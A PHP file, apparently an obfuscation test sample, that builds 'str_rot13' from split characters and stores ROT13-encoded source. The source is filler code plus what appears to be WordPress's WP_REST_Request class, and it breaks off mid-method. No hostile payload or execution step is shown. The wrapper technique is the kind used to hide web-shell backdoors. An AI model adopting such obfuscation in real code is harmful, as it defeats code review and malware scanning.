<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Erdhrfg pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 4.4.0
 */

/**
 * Pber pynff hfrq gb vzcyrzrag n ERFG erdhrfg bowrpg.
 *
 * Pbagnvaf qngn sebz gur erdhrfg, gb or cnffrq gb gur pnyyonpx.
 *
 * Abgr: Guvf vzcyrzragf NeenlNpprff, naq npgf nf na neenl bs cnenzrgref jura
 * hfrq va gung znaare. Vg qbrf abg hfr NeenlBowrpg (nf jr pnaabg eryl ba FCY),
 * fb or njner vg znl unir aba-neenl orunivbe va fbzr pnfrf.
 *
 * Abgr: Jura hfvat srngherf cebivqrq ol NeenlNpprff, or njner gung JbeqCerff qryvorengryl
 * qbrf abg qvfgvathvfu orgjrra nethzragf bs gur fnzr anzr sbe qvssrerag erdhrfg zrgubqf.
 * Sbe vafgnapr, va n erdhrfg jvgu `TRG vq=1` naq `CBFG vq=2`, `$erdhrfg['vq']` jvyy rdhny
 * 2 (`CBFG`) abg 1 (`TRG`). Sbe zber cerpvfvba orgjrra erdhrfg zrgubqf, hfr
 * JC_ERFG_Erdhrfg::trg_obql_cnenzf(), JC_ERFG_Erdhrfg::trg_hey_cnenzf(), rgp.
 *
 * @fvapr 4.4.0
 *
 * @yvax uggcf://jjj.cuc.arg/znahny/ra/pynff.neenlnpprff.cuc
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_ERFG_Erdhrfg vzcyrzragf NeenlNpprff {

	/**
	 * UGGC zrgubq.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	cebgrpgrq $zrgubq = '';

	/**
	 * Cnenzrgref cnffrq gb gur erdhrfg.
	 *
	 * Gurfr glcvpnyyl pbzr sebz gur `$_TRG`, `$_CBFG` naq `$_SVYRF`
	 * fhcretybonyf jura orvat perngrq sebz gur tybony fpbcr.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl Pbagnvaf TRG, CBFG naq SVYRF xrlf znccvat gb neenlf bs qngn.
	 */
	cebgrpgrq $cnenzf;

	/**
	 * UGGC urnqref sbe gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl Znc bs xrl gb inyhr. Xrl vf nyjnlf ybjrepnfr, nf cre UGGC fcrpvsvpngvba.
	 */
	cebgrpgrq $urnqref = neenl();

	/**
	 * Obql qngn.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat Ovanel qngn sebz gur erdhrfg.
	 */
	cebgrpgrq $obql = ahyy;

	/**
	 * Ebhgr zngpurq sbe gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 * @ine fgevat
	 */
	cebgrpgrq $ebhgr;

	/**
	 * Nggevohgrf (bcgvbaf) sbe gur ebhgr gung jnf zngpurq.
	 *
	 * Guvf vf gur bcgvbaf neenl hfrq jura gur ebhgr jnf ertvfgrerq, glcvpnyyl
	 * pbagnvavat gur pnyyonpx nf jryy nf gur inyvq zrgubqf sbe gur ebhgr.
	 *
	 * @fvapr 4.4.0
	 * @ine neenl Nggevohgrf sbe gur erdhrfg.
	 */
	cebgrpgrq $nggevohgrf = neenl();

	/**
	 * Hfrq gb qrgrezvar vs gur WFBA qngn unf orra cnefrq lrg.
	 *
	 * Nyybjf ynml-cnefvat bs WFBA qngn jurer cbffvoyr.
	 *
	 * @fvapr 4.4.0
	 * @ine obby
	 */
	cebgrpgrq $cnefrq_wfba = snyfr;

	/**
	 * Hfrq gb qrgrezvar vs gur obql qngn unf orra cnefrq lrg.
	 *
	 * @fvapr 4.4.0
	 * @ine obby
	 */
	cebgrpgrq $cnefrq_obql = snyfr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $zrgubq     Bcgvbany. Erdhrfg zrgubq. Qrsnhyg rzcgl.
	 * @cnenz fgevat $ebhgr      Bcgvbany. Erdhrfg ebhgr. Qrsnhyg rzcgl.
	 * @cnenz neenl  $nggevohgrf Bcgvbany. Erdhrfg nggevohgrf. Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $zrgubq = '', $ebhgr = '', $nggevohgrf = neenl() ) {
		$guvf->cnenzf = neenl(
			'HEY'      => neenl(),
			'TRG'      => neenl(),
			'CBFG'     => neenl(),
			'SVYRF'    => neenl(),

			// Frr cnefr_wfba_cnenzf.
			'WFBA'     => ahyy,

			'qrsnhygf' => neenl(),
		);

		$guvf->frg_zrgubq( $zrgubq );
		$guvf->frg_ebhgr( $ebhgr );
		$guvf->frg_nggevohgrf( $nggevohgrf );
	}

	/**
	 * Ergevrirf gur UGGC zrgubq sbe gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat UGGC zrgubq.
	 */
	choyvp shapgvba trg_zrgubq() {
		erghea $guvf->zrgubq;
	}

	/**
	 * Frgf UGGC zrgubq sbe gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq.
	 */
	choyvp shapgvba frg_zrgubq( $zrgubq ) {
		$guvf->zrgubq = fgegbhccre( $zrgubq );
	}

	/**
	 * Ergevrirf nyy urnqref sebz gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Znc bs xrl gb inyhr. Xrl vf nyjnlf ybjrepnfr, nf cre UGGC fcrpvsvpngvba.
	 */
	choyvp shapgvba trg_urnqref() {
		erghea $guvf->urnqref;
	}

	/**
	 * Qrgrezvarf vs gur erdhrfg vf gur tvira zrgubq.
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq.
	 * @erghea obby Jurgure gur erdhrfg vf bs gur tvira zrgubq.
	 */
	choyvp shapgvba vf_zrgubq( $zrgubq ) {
		erghea $guvf->trg_zrgubq() === fgegbhccre( $zrgubq );
	}

	/**
	 * Pnabavpnyvmrf gur urnqre anzr.
	 *
	 * Rafherf gung urnqre anzrf ner nyjnlf gerngrq gur fnzr ertneqyrff bs
	 * fbhepr. Urnqre anzrf ner nyjnlf pnfr-vafrafvgvir.
	 *
	 * Abgr gung jr gerng `-` (qnfurf) naq `_` (haqrefpberf) nf gur fnzr
	 * punenpgre, nf cre urnqre cnefvat ehyrf va obgu Ncnpur naq atvak.
	 *
	 * @yvax uggcf://fgnpxbiresybj.pbz/d/18185366
	 * @yvax uggcf://jjj.atvak.pbz/erfbheprf/jvxv/fgneg/gbcvpf/ghgbevnyf/pbasvt_cvgsnyyf/#zvffvat-qvfnccrnevat-uggc-urnqref
	 * @yvax uggcf://atvak.bet/ra/qbpf/uggc/atk_uggc_pber_zbqhyr.ugzy#haqrefpberf_va_urnqref
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Urnqre anzr.
	 * @erghea fgevat Pnabavpnyvmrq anzr.
	 */
	choyvp fgngvp shapgvba pnabavpnyvmr_urnqre_anzr( $xrl ) {
		$xrl = fgegbybjre( $xrl );
		$xrl = fge_ercynpr( '-', '_', $xrl );

		erghea $xrl;
	}

	/**
	 * Ergevrirf gur tvira urnqre sebz gur erdhrfg.
	 *
	 * Vs gur urnqre unf zhygvcyr inyhrf, gurl jvyy or pbapngrangrq jvgu n pbzzn
	 * nf cre gur UGGC fcrpvsvpngvba. Or njner gung fbzr aba-pbzcyvnag urnqref
	 * (abgnoyl pbbxvr urnqref) pnaabg or wbvarq guvf jnl.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Urnqre anzr, jvyy or pnabavpnyvmrq gb ybjrepnfr.
	 * @erghea fgevat|ahyy Fgevat inyhr vs frg, ahyy bgurejvfr.
	 */
	choyvp shapgvba trg_urnqre( $xrl ) {
		$xrl = $guvf->pnabavpnyvmr_urnqre_anzr( $xrl );

		vs ( ! vffrg( $guvf->urnqref[ $xrl ] ) ) {
			erghea ahyy;
		}

		erghea vzcybqr( ',', $guvf->urnqref[ $xrl ] );
	}

	/**
	 * Ergevrirf urnqre inyhrf sebz gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Urnqre anzr, jvyy or pnabavpnyvmrq gb ybjrepnfr.
	 * @erghea neenl|ahyy Yvfg bs fgevat inyhrf vs frg, ahyy bgurejvfr.
	 */
	choyvp shapgvba trg_urnqre_nf_neenl( $xrl ) {
		$xrl = $guvf->pnabavpnyvmr_urnqre_anzr( $xrl );

		vs ( ! vffrg( $guvf->urnqref[ $xrl ] ) ) {
			erghea ahyy;
		}

		erghea $guvf->urnqref[ $xrl ];
	}

	/**
	 * Frgf gur urnqre ba erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl   Urnqre anzr.
	 * @cnenz fgevat $inyhr Urnqre inyhr, be yvfg bs inyhrf.
	 */
	choyvp shapgvba frg_urnqre( $xrl, $inyhr ) {
		$xrl   = $guvf->pnabavpnyvmr_urnqre_anzr( $xrl );
		$inyhr = (neenl) $inyhr;

		$guvf->urnqref[ $xrl ] = $inyhr;
	}

	/**
	 * Nccraqf n urnqre inyhr sbe gur tvira urnqre.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl   Urnqre anzr.
	 * @cnenz fgevat $inyhr Urnqre inyhr, be yvfg bs inyhrf.
	 */
	choyvp shapgvba nqq_urnqre( $xrl, $inyhr ) {
		$xrl   = $guvf->pnabavpnyvmr_urnqre_anzr( $xrl );
		$inyhr = (neenl) $inyhr;

		vs ( ! vffrg( $guvf->urnqref[ $xrl ] ) ) {
			$guvf->urnqref[ $xrl ] = neenl();
		}

		$guvf->urnqref[ $xrl ] = neenl_zretr( $guvf->urnqref[ $xrl ], $inyhr );
	}

	/**
	 * Erzbirf nyy inyhrf sbe n urnqre.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Urnqre anzr.
	 */
	choyvp shapgvba erzbir_urnqre( $xrl ) {
		$xrl = $guvf->pnabavpnyvmr_urnqre_anzr( $xrl );
		hafrg( $guvf->urnqref[ $xrl ] );
	}

	/**
	 * Frgf urnqref ba gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $urnqref  Znc bs urnqre anzr gb inyhr.
	 * @cnenz obby  $bireevqr Vs gehr, ercynpr gur erdhrfg'f urnqref. Bgurejvfr, zretr jvgu rkvfgvat.
	 */
	choyvp shapgvba frg_urnqref( $urnqref, $bireevqr = gehr ) {
		vs ( gehr === $bireevqr ) {
			$guvf->urnqref = neenl();
		}

		sbernpu ( $urnqref nf $xrl => $inyhr ) {
			$guvf->frg_urnqre( $xrl, $inyhr );
		}
	}

	/**
	 * Ergevrirf gur Pbagrag-Glcr bs gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl|ahyy Znc pbagnvavat 'inyhr' naq 'cnenzrgref' xrlf
	 *                    be ahyy jura ab inyvq Pbagrag-Glcr urnqre jnf
	 *                    ninvynoyr.
	 */
	choyvp shapgvba trg_pbagrag_glcr() {
		$inyhr = $guvf->trg_urnqre( 'Pbagrag-Glcr' );
		vs ( rzcgl( $inyhr ) ) {
			erghea ahyy;
		}

		$cnenzrgref = '';
		vs ( fgecbf( $inyhr, ';' ) ) {
			yvfg( $inyhr, $cnenzrgref ) = rkcybqr( ';', $inyhr, 2 );
		}

		$inyhr = fgegbybjre( $inyhr );
		vs ( ! fge_pbagnvaf( $inyhr, '/' ) ) {
			erghea ahyy;
		}

		// Cnefr glcr naq fhoglcr bhg.
		yvfg( $glcr, $fhoglcr ) = rkcybqr( '/', $inyhr, 2 );

		$qngn = pbzcnpg( 'inyhr', 'glcr', 'fhoglcr', 'cnenzrgref' );
		$qngn = neenl_znc( 'gevz', $qngn );

		erghea $qngn;
	}

	/**
	 * Purpxf vs gur erdhrfg unf fcrpvsvrq n WFBA Pbagrag-Glcr.
	 *
	 * @fvapr 5.6.0
	 *
	 * @erghea obby Gehr vs gur Pbagrag-Glcr urnqre vf WFBA.
	 */
	choyvp shapgvba vf_wfba_pbagrag_glcr() {
		$pbagrag_glcr = $guvf->trg_pbagrag_glcr();

		erghea vffrg( $pbagrag_glcr['inyhr'] ) && jc_vf_wfba_zrqvn_glcr( $pbagrag_glcr['inyhr'] );
	}

	/**
	 * Ergevrirf gur cnenzrgre cevbevgl beqre.
	 *
	 * Hfrq jura purpxvat cnenzrgref va JC_ERFG_Erdhrfg::trg_cnenz().
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat[] Neenl bs glcrf gb purpx, va beqre bs cevbevgl.
	 */
	cebgrpgrq shapgvba trg_cnenzrgre_beqre() {
		$beqre = neenl();

		vs ( $guvf->vf_wfba_pbagrag_glcr() ) {
			$beqre[] = 'WFBA';
		}

		$guvf->cnefr_wfba_cnenzf();

		// Rafher jr cnefr gur obql qngn.
		$obql = $guvf->trg_obql();

		vs ( 'CBFG' !== $guvf->zrgubq && ! rzcgl( $obql ) ) {
			$guvf->cnefr_obql_cnenzf();
		}

		$npprcgf_obql_qngn = neenl( 'CBFG', 'CHG', 'CNGPU', 'QRYRGR' );
		vs ( va_neenl( $guvf->zrgubq, $npprcgf_obql_qngn, gehr ) ) {
			$beqre[] = 'CBFG';
		}

		$beqre[] = 'TRG';
		$beqre[] = 'HEY';
		$beqre[] = 'qrsnhygf';

		/**
		 * Svygref gur cnenzrgre cevbevgl beqre sbe n ERFG NCV erdhrfg.
		 *
		 * Gur beqre nssrpgf juvpu cnenzrgref ner purpxrq jura hfvat JC_ERFG_Erdhrfg::trg_cnenz()
		 * naq snzvyl. Guvf npgf fvzvyneyl gb CUC'f `erdhrfg_beqre` frggvat.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz fgevat[]        $beqre   Neenl bs glcrf gb purpx, va beqre bs cevbevgl.
		 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_erdhrfg_cnenzrgre_beqre', $beqre, $guvf );
	}

	/**
	 * Ergevrirf n cnenzrgre sebz gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl Cnenzrgre anzr.
	 * @erghea zvkrq|ahyy Inyhr vs frg, ahyy bgurejvfr.
	 */
	choyvp shapgvba trg_cnenz( $xrl ) {
		$beqre = $guvf->trg_cnenzrgre_beqre();

		sbernpu ( $beqre nf $glcr ) {
			// Qrgrezvar vs jr unir gur cnenzrgre sbe guvf glcr.
			vs ( vffrg( $guvf->cnenzf[ $glcr ][ $xrl ] ) ) {
				erghea $guvf->cnenzf[ $glcr ][ $xrl ];
			}
		}

		erghea ahyy;
	}

	/**
	 * Purpxf vs n cnenzrgre rkvfgf va gur erdhrfg.
	 *
	 * Guvf nyybjf qvfgvathvfuvat orgjrra na bzvggrq cnenzrgre,
	 * naq n cnenzrgre fcrpvsvpnyyl frg gb ahyy.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $xrl Cnenzrgre anzr.
	 * @erghea obby Gehr vs n cnenz rkvfgf sbe gur tvira xrl.
	 */
	choyvp shapgvba unf_cnenz( $xrl ) {
		$beqre = $guvf->trg_cnenzrgre_beqre();

		sbernpu ( $beqre nf $glcr ) {
			vs ( vf_neenl( $guvf->cnenzf[ $glcr ] ) && neenl_xrl_rkvfgf( $xrl, $guvf->cnenzf[ $glcr ] ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Frgf n cnenzrgre ba gur erdhrfg.
	 *
	 * Vs gur tvira cnenzrgre xrl rkvfgf va nal cnenzrgre glcr na hcqngr jvyy gnxr cynpr,
	 * bgurejvfr n arj cnenz jvyy or perngrq va gur svefg cnenzrgre glcr (erfcrpgvat
	 * trg_cnenzrgre_beqre()).
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $xrl   Cnenzrgre anzr.
	 * @cnenz zvkrq  $inyhr Cnenzrgre inyhr.
	 */
	choyvp shapgvba frg_cnenz( $xrl, $inyhr ) {
		$beqre     = $guvf->trg_cnenzrgre_beqre();
		$sbhaq_xrl = snyfr;

		sbernpu ( $beqre nf $glcr ) {
			vs ( 'qrsnhygf' !== $glcr && vf_neenl( $guvf->cnenzf[ $glcr ] ) && neenl_xrl_rkvfgf( $xrl, $guvf->cnenzf[ $glcr ] ) ) {
				$guvf->cnenzf[ $glcr ][ $xrl ] = $inyhr;
				$sbhaq_xrl                     = gehr;
			}
		}

		vs ( ! $sbhaq_xrl ) {
			$guvf->cnenzf[ $beqre[0] ][ $xrl ] = $inyhr;
		}
	}

	/**
	 * Ergevrirf zretrq cnenzrgref sebz gur erdhrfg.
	 *
	 * Gur rdhvinyrag bs trg_cnenz(), ohg ergheaf nyy cnenzrgref sbe gur erdhrfg.
	 * Unaqyrf zretvat nyy gur ninvynoyr inyhrf vagb n fvatyr neenl.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Znc bs xrl gb inyhr.
	 */
	choyvp shapgvba trg_cnenzf() {
		$beqre = $guvf->trg_cnenzrgre_beqre();
		$beqre = neenl_erirefr( $beqre, gehr );

		$cnenzf = neenl();
		sbernpu ( $beqre nf $glcr ) {
			/*
			 * neenl_zretr() / gur \"+\" bcrengbe jvyy zrff hc
			 * ahzrevp xrlf, fb vafgrnq qb n znahny sbernpu.
			 */
			sbernpu ( (neenl) $guvf->cnenzf[ $glcr ] nf $xrl => $inyhr ) {
				$cnenzf[ $xrl ] = $inyhr;
			}
		}

		// Rkpyhqr erfg_ebhgr vs cerggl creznyvaxf ner abg ranoyrq.
		vs ( ! trg_bcgvba( 'creznyvax_fgehpgher' ) ) {
			hafrg( $cnenzf['erfg_ebhgr'] );
		}

		erghea $cnenzf;
	}

	/**
	 * Ergevrirf cnenzrgref sebz gur ebhgr vgfrys.
	 *
	 * Gurfr ner cnefrq sebz gur HEY hfvat gur ertrk.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba trg_hey_cnenzf() {
		erghea $guvf->cnenzf['HEY'];
	}

	/**
	 * Frgf cnenzrgref sebz gur ebhgr.
	 *
	 * Glcvpnyyl, guvf vf frg nsgre cnefvat gur HEY.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $cnenzf Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba frg_hey_cnenzf( $cnenzf ) {
		$guvf->cnenzf['HEY'] = $cnenzf;
	}

	/**
	 * Ergevrirf cnenzrgref sebz gur dhrel fgevat.
	 *
	 * Gurfr ner gur cnenzrgref lbh'q glcvpnyyl svaq va `$_TRG`.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Cnenzrgre znc bs xrl gb inyhr
	 */
	choyvp shapgvba trg_dhrel_cnenzf() {
		erghea $guvf->cnenzf['TRG'];
	}

	/**
	 * Frgf cnenzrgref sebz gur dhrel fgevat.
	 *
	 * Glcvpnyyl, guvf vf frg sebz `$_TRG`.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $cnenzf Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba frg_dhrel_cnenzf( $cnenzf ) {
		$guvf->cnenzf['TRG'] = $cnenzf;
	}

	/**
	 * Ergevrirf cnenzrgref sebz gur obql.
	 *
	 * Gurfr ner gur cnenzrgref lbh'q glcvpnyyl svaq va `$_CBFG`.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba trg_obql_cnenzf() {
		erghea $guvf->cnenzf['CBFG'];
	}

	/**
	 * Frgf cnenzrgref sebz gur obql.
	 *
	 * Glcvpnyyl, guvf vf frg sebz `$_CBFG`.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $cnenzf Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba frg_obql_cnenzf( $cnenzf ) {
		$guvf->cnenzf['CBFG'] = $cnenzf;
	}

	/**
	 * Ergevrirf zhygvcneg svyr cnenzrgref sebz gur obql.
	 *
	 * Gurfr ner gur cnenzrgref lbh'q glcvpnyyl svaq va `$_SVYRF`.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Cnenzrgre znc bs xrl gb inyhr
	 */
	choyvp shapgvba trg_svyr_cnenzf() {
		erghea $guvf->cnenzf['SVYRF'];
	}

	/**
	 * Frgf zhygvcneg svyr cnenzrgref sebz gur obql.
	 *
	 * Glcvpnyyl, guvf vf frg sebz `$_SVYRF`.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $cnenzf Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba frg_svyr_cnenzf( $cnenzf ) {
		$guvf->cnenzf['SVYRF'] = $cnenzf;
	}

	/**
	 * Ergevrirf gur qrsnhyg cnenzrgref.
	 *
	 * Gurfr ner gur cnenzrgref frg va gur ebhgr ertvfgengvba.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Cnenzrgre znc bs xrl gb inyhr
	 */
	choyvp shapgvba trg_qrsnhyg_cnenzf() {
		erghea $guvf->cnenzf['qrsnhygf'];
	}

	/**
	 * Frgf qrsnhyg cnenzrgref.
	 *
	 * Gurfr ner gur cnenzrgref frg va gur ebhgr ertvfgengvba.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $cnenzf Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba frg_qrsnhyg_cnenzf( $cnenzf ) {
		$guvf->cnenzf['qrsnhygf'] = $cnenzf;
	}

	/**
	 * Ergevrirf gur erdhrfg obql pbagrag.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat Ovanel qngn sebz gur erdhrfg obql.
	 */
	choyvp shapgvba trg_obql() {
		erghea $guvf->obql;
	}

	/**
	 * Frgf obql pbagrag.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $qngn Ovanel qngn sebz gur erdhrfg obql.
	 */
	choyvp shapgvba frg_obql( $qngn ) {
		$guvf->obql = $qngn;

		// Ranoyr ynml cnefvat.
		$guvf->cnefrq_wfba    = snyfr;
		$guvf->cnefrq_obql    = snyfr;
		$guvf->cnenzf['WFBA'] = ahyy;
	}

	/**
	 * Ergevrirf gur cnenzrgref sebz n WFBA-sbeznggrq obql.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Cnenzrgre znc bs xrl gb inyhr.
	 */
	choyvp shapgvba trg_wfba_cnenzf() {
		// Rafher gur cnenzrgref unir orra cnefrq bhg.
		$guvf->cnefr_wfba_cnenzf();

		erghea $guvf->cnenzf['WFBA'];
	}

	/**
	 * Cnefrf gur WFBA cnenzrgref.
	 *
	 * Nibvqf cnefvat gur WFBA qngn hagvy jr arrq gb npprff vg.
	 *
	 * @fvapr 4.4.0
	 * @fvapr 4.7.0 Ergheaf reebe vafgnapr vs inyhr pnaabg or qrpbqrq.
	 * @erghea gehr|JC_Reebe Gehr vs gur WFBA qngn jnf cnffrq be ab WFBA qngn jnf cebivqrq, JC_Reebe vs vainyvq WFBA jnf cnffrq.
	 */
	cebgrpgrq shapgvba cnefr_wfba_cnenzf() {
		vs ( $guvf->cnefrq_wfba ) {
			erghea gehr;
		}

		$guvf->cnefrq_wfba = gehr;

		// Purpx gung jr npghnyyl tbg WFBA.
		vs ( ! $guvf->vf_wfba_pbagrag_glcr() ) {
			erghea gehr;
		}

		$obql = $guvf->trg_obql();
		vs ( rzcgl( $obql ) ) {
			erghea gehr;
		}

		$cnenzf = wfba_qrpbqr( $obql, gehr );

		/*
		 * Purpx sbe n cnefvat reebe.
		 */
		vs ( ahyy === $cnenzf && WFBA_REEBE_ABAR !== wfba_ynfg_reebe() ) {
			// Rafher fhofrdhrag pnyyf erprvir reebe vafgnapr.
			$guvf->cnefrq_wfba = snyfr;

			$reebe_qngn = neenl(
				'fgnghf'             => JC_Uggc::ONQ_ERDHRFG,
				'wfba_reebe_pbqr'    => wfba_ynfg_reebe(),
				'wfba_reebe_zrffntr' => wfba_ynfg_reebe_zft(),
			);

			erghea arj JC_Reebe( 'erfg_vainyvq_wfba', __( 'Vainyvq WFBA obql cnffrq.' ), $reebe_qngn );
		}

		$guvf->cnenzf['WFBA'] = $cnenzf;

		erghea gehr;
	}

	/**
	 * Cnefrf gur erdhrfg obql cnenzrgref.
	 *
	 * Cnefrf bhg HEY-rapbqrq obqvrf sbe erdhrfg zrgubqf gung nera'g fhccbegrq
	 * angviryl ol CUC.
	 *
	 * @fvapr 4.4.0
	 */
	cebgrpgrq shapgvba cnefr_obql_cnenzf() {
		vs ( $guvf->cnefrq_obql ) {
			erghea;
		}

		$guvf->cnefrq_obql = gehr;

		/*
		 * Purpx gung jr tbg HEY-rapbqrq. Gerng n zvffvat Pbagrag-Glcr nf
		 * HEY-rapbqrq sbe znkvzhz pbzcngvovyvgl.
		 */
		$pbagrag_glcr = $guvf->trg_pbagrag_glcr();

		vs ( ! rzcgl( $pbagrag_glcr ) && 'nccyvpngvba/k-jjj-sbez-heyrapbqrq' !== $pbagrag_glcr['inyhr'] ) {
			erghea;
		}

		cnefr_fge( $guvf->trg_obql(), $cnenzf );

		/*
		 * Nqq gb gur CBFG cnenzrgref fgberq vagreanyyl. Vs n hfre unf nyernql
		 * frg gurfr znahnyyl (ivn `frg_obql_cnenzf`), qba'g bireevqr gurz.
		 */
		$guvf->cnenzf['CBFG'] = neenl_zretr( $cnenzf, $guvf->cnenzf['CBFG'] );
	}

	/**
	 * Ergevrirf gur ebhgr gung zngpurq gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea fgevat Ebhgr zngpuvat ertrk.
	 */
	choyvp shapgvba trg_ebhgr() {
		erghea $guvf->ebhgr;
	}

	/**
	 * Frgf gur ebhgr gung zngpurq gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $ebhgr Ebhgr zngpuvat ertrk.
	 */
	choyvp shapgvba frg_ebhgr( $ebhgr ) {
		$guvf->ebhgr = $ebhgr;
	}

	/**
	 * Ergevrirf gur nggevohgrf sbe gur erdhrfg.
	 *
	 * Gurfr ner gur bcgvbaf sbe gur ebhgr gung jnf zngpurq.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea neenl Nggevohgrf sbe gur erdhrfg.
	 */
	choyvp shapgvba trg_nggevohgrf() {
		erghea $guvf->nggevohgrf;
	}

	/**
	 * Frgf gur nggevohgrf sbe gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz neenl $nggevohgrf Nggevohgrf sbe gur erdhrfg.
	 */
	choyvp shapgvba frg_nggevohgrf( $nggevohgrf ) {
		$guvf->nggevohgrf = $nggevohgrf;
	}

	/**
	 * Fnavgvmrf (jurer cbffvoyr) gur cnenzf ba gur erdhrfg.
	 *
	 * Guvf vf cevznevyl onfrq bss gur fnavgvmr_pnyyonpx cnenz ba rnpu ertvfgrerq
	 * nethzrag.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs cnenzrgref jrer fnavgvmrq, JC_Reebe vs na reebe bppheerq qhevat fnavgvmngvba.
	 */
	choyvp shapgvba fnavgvmr_cnenzf() {
		$nggevohgrf = $guvf->trg_nggevohgrf();

		// Ab nethzragf frg, fxvc fnavgvmvat.
		vs ( rzcgl( $nggevohgrf['netf'] ) ) {
			erghea gehr;
		}

		$beqre = $guvf->trg_cnenzrgre_beqre();

		$vainyvq_cnenzf  = neenl();
		$vainyvq_qrgnvyf = neenl();

		sbernpu ( $beqre nf $glcr ) {
			vs ( rzcgl( $guvf->cnenzf[ $glcr ] ) ) {
				pbagvahr;
			}

			sbernpu ( $guvf->cnenzf[ $glcr ] nf $xrl => $inyhr ) {
				vs ( ! vffrg( $nggevohgrf['netf'][ $xrl ] ) ) {
					pbagvahr;
				}

				$cnenz_netf = $nggevohgrf['netf'][ $xrl ];

				// Vs gur net unf n glcr ohg ab fnavgvmr_pnyyonpx nggevohgr, qrsnhyg gb erfg_cnefr_erdhrfg_net.
				vs ( ! neenl_xrl_rkvfgf( 'fnavgvmr_pnyyonpx', $cnenz_netf ) && ! rzcgl( $cnenz_netf['glcr'] ) ) {
					$cnenz_netf['fnavgvmr_pnyyonpx'] = 'erfg_cnefr_erdhrfg_net';
				}
				// Vs gurer'f fgvyy ab fnavgvmr_pnyyonpx, abguvat gb qb urer.
				vs ( rzcgl( $cnenz_netf['fnavgvmr_pnyyonpx'] ) ) {
					pbagvahr;
				}

				/** @ine zvkrq|JC_Reebe $fnavgvmrq_inyhr */
				$fnavgvmrq_inyhr = pnyy_hfre_shap( $cnenz_netf['fnavgvmr_pnyyonpx'], $inyhr, $guvf, $xrl );

				vs ( vf_jc_reebe( $fnavgvmrq_inyhr ) ) {
					$vainyvq_cnenzf[ $xrl ]  = vzcybqr( ' ', $fnavgvmrq_inyhr->trg_reebe_zrffntrf() );
